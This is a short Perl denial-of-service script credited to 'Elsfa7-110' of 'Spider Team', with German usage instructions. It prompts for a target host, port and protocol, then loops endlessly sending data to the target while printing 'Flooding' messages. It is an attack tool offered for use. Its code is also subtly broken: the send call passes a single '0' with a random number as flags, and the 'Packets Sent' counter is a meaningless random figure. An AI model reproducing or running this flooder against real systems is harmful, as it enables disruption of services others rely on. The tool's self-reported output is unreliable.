#Elsfa7-110
use IO::Socket;
 
system ('cls');
system ('title DDOS Elsfa7-110');
print "\a
----------------------
:::DDoS by Elsfa7-110::::Group Spider Team
----------------------
\n";

print "\nSo Funktionierts, Das programm fragt dich nach den Hostnamen od. Ip addresse und dan nach den Port (standartmäßig 80), Dan das protocol TCP oder UDP, Wen du beides benötigst gib TCP,UDP ein. \n\n";
 
system ('PAUSE');
system ('cls');
 
print "\nHost:\a";
chomp ($host = <STDIN>);
 
system ('cls');
 
print "\nPort:\a";
chomp ($port = <STDIN>);
 
system ('cls');
 
print "\nProtokol (TCP oder. UDP):\a";
chomp ($proto = <STDIN>);
 
{
 
$sock = IO::Socket::INET->new(Proto=>"$proto", PeerAddr=>"$host", PeerPort=>"$port") || die "\nCould not connect to the remote machine. Either the machine is offline or the port is not in use on the selected protocol.\a";
 
}
 
Packets:
while (1) {
$size = rand() * 8921873 * 9991988;
print ("Flooding By Elsfa7-110: $host:$port~$proto Packets Sent: $size\n");
send($sock, 0, $size)
 
}
